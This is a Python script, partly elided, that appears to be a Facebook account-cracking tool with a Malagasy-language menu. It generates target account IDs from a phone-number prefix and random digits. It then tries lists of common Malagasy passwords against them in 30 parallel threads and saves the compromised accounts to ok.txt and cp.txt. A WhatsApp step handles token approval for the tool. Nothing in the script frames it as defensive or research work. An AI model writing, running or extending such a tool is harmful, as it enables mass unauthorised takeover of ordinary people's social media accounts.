...
logo = """
 ...
 .S_sSSs      sSSs_sSSs     .S_sSSs     .S_sSSs     .S S.   
.SS~YS%%b    d%%SP~YS%%b   .SS~YS%%b   .SS~YS%%b   .SS SS.  
S%S   `S%b  d%S'     `S%b  S%S   `S%b  S%S   `S%b  S%S S%S  
S%S    S%S  S%S       S%S  S%S    S%S  S%S    S%S  S%S S%S  
S%S    d*S  S&S       S&S  S%S    S&S  S%S    S&S  S%S S%S  
S&S   .S*S  S&S       S&S  S&S    S&S  S&S    S&S   SS SS   
S&S_sdSSS   S&S       S&S  S&S    S&S  S&S    S&S    S S    
S&S~YSY%b   S&S       S&S  S&S    S&S  S&S    S&S    SSS    
S*S   `S%b  S*b       d*S  S*S    S*S  S*S    S*S    S*S    
S*S    S%S  S*S.     .S*S  S*S    S*S  S*S    S*S    S*S    
S*S    S&S   SSSbs_sdSSS   S*S    S*S  S*S    S*S    S*S    
S*S    SSS    YSSP~YSSY    S*S    SSS  S*S    SSS    S*S    
SP                         SP          SP            SP     
Y                          Y           Y             Y      
...
[•] FACEBOOK     : \x1b[38;5;208mRIVONANDRASANARONNY
[•] TOOL TYPE  : \x1b[38;5;208mTSY FANTATRA\033[1;37m
[•] STATUS     : \x1b[38;5;208mMAIMAIN-POANA\033[1;37m
--------------------------------------------------
[•] \033[1;37mVERSION    :\033[1;32m 2.7\033[1;37m
[•]\033[1;31m FOR\033[1;36m HATERS \033[1;34mMIANDRY SY \033[1;37mTENENINA
--------------------------------------------------             
 """
def lines():
	print('\33[1;37m--------------------------------------------------')
...
cps = []
try:
    print('\n\033[1;37m[•] MIANDRY FANAMBOARANA')
...
except:print('\n\033[1;31mTapaka connexion ... \033[0;97m')
...
def SIALZADA():
	print(logo)
	print('[1] KAONTY VAZAHA')
	print('[2] KAONTY VAZAHA')
	print('[3] KAONTY GASY')
	print('[4] ANTSOY MPAMORONA ( RONNY) ')
	print('[0] MIALA')
	lines()
	gh = input('[•] SAFIDIO : ')
	if gh =='1':
...
def menu():
	...
	if opt =='1':
		...
		print('\n\033[1;37m[•] Safidio Valiny Marina\033[0;97m')
		time.sleep(2)
		menu()
...
def svn_digit():
	...
	os.system('clear')
	print(logo)
	print('[•] OHATRA :26134,26133,26132.ETC')
	lines()
	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	print('[•] MAX LIMIT [1000]')
	lines()
...
def ali_khan():
	...
	os.system('clear')
	print(logo)
	print('[•] OHATTA : 26134,26133,26132 .ETC')
	lines()
	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [guru,'malagasy','faniry','malala123','nantenaina','nomena']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
...
def pubg():
	...
	print('[√] OHATRA :26134,26133,26132.ETC')
	lines()
	kode = input('[+]\033[1;37m APETAO KAODINAO : ')
	os.system('clear')
	print(logo)
	print('[•] LIMIT [1000]')
	lines()
...
def chos():
    ...
    os.system("clear")
    print(logo)
    print('\x1b[1;91m[•] AMPIDIRO KAODY: ')
    lines()
    code = input(' KAODIKO : ')
    lines()
    os.system('clear')
    ...
    lines()
    passx = int(input("[•] ISANY TENY MIAFINA : "))
    SIALZADA = []
    os.system('clear')
    print(logo)
    print('[•] EXAMPLE : malala,faniry,nirina,Etc')
    lines()
    for bilal in range(passx):
        pww = input(f"[•] AMPIDIRO TENY MIAFINA{bilal+1} : ")
    ...
    print('Vita soamantsara fakanao kaonty gasy')
    print('Ids saved in ok.txt,cp.txt')
    SIAL-ZADA()
#_____
...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+2617075631?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
